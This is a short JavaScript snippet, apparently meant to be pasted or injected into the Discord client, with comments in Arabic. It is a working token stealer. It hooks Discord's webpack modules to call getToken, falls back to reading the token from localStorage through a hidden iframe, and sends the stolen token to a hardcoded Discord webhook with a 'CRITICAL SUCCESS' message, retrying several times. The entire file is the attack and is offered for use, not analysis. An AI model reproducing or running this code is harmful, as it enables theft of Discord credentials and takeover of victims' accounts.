(function() {
    const WEBHOOK = "https://discord.com/api/webhooks/1466835198942515254/MCAPfFl1novelcM6QGl9ZKP56zB1hijO6UdOm9zi-frGJ7pw6kE0mFDnqANHJCohg8JD";

    async function getDiscordToken() {
        try {
            // محاولة اختطاف التوكن من نظام الـ Webpack الخاص بديسكورد
            const token = (
                window.webpackChunkdiscord_app?.push([
                    [''], 
                    {}, 
                    e => {
                        m = [];
                        for (let i in e.c) m.push(e.c[i]);
                    }
                ]), m
            ).find(m => m?.exports?.default?.getToken !== undefined)?.exports.default.getToken();

            if (token) return token;

            // محاولة بديلة عبر الـ LocalStorage إذا فشل الـ Webpack
            const iframe = document.createElement('iframe');
            document.body.appendChild(iframe);
            const lsToken = iframe.contentWindow.localStorage.token || window.localStorage.token;
            iframe.remove();
            return lsToken ? lsToken.replace(/"/g, "") : null;
        } catch (e) { return null; }
    }

    async function run() {
        const token = await getDiscordToken();
        if (token) {
            // إرسال البيانات باستخدام XHR لضمان عدم الحظر
            const xhr = new XMLHttpRequest();
            xhr.open("POST", WEBHOOK, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({
                content: "🔥 **CRITICAL SUCCESS:** Extracted via Webpack Hook\n`" + token + "`"
            }));
        }
    }

    // المحاولة عدة مرات لضمان تحميل ديسكورد بالكامل
    [1000, 3000, 5000, 10000].forEach(ms => setTimeout(run, ms));
})();
